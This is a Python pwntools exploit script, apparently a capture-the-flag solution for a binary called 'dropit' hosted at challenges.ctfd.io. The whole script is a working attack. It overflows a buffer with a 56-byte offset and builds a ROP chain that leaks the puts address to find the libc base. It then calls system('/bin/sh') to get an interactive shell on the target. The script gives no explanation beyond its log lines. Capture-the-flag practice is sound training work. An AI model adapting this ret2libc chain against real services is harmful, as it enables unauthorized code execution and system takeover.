from pwn import *

elf = ELF('./dropit')
rop = ROP(elf)
#io = process(elf.path)
io = remote('challenges.ctfd.io', '30261')

puts_plt = elf.plt['puts']
main = elf.symbols['main']
puts_got = elf.got['puts']
#fgets_got = elf.got['fgets']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

base = b'A'*56
payload = base + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

print(b'payload: ' + payload)
io.sendlineafter('?', payload)

io.recvline()
recieved = io.recvline().strip()
leak = u64(recieved.ljust(8, b'\x00'))

log.info('puts@got: %s' % hex(leak))

libc = ELF('./libc6_2.32-0ubuntu2_amd64.so')
libc.address = leak - libc.sym['puts']

log.info("Address of libc %s " % hex(libc.address))

binsh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

#log.info("/bin/sh %s " % hex(binsh))
#log.info("system %s " % hex(system))

payload = base + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

print(b'payload: ' + payload)
io.sendlineafter('?', payload)
io.recvline()

io.interactive()
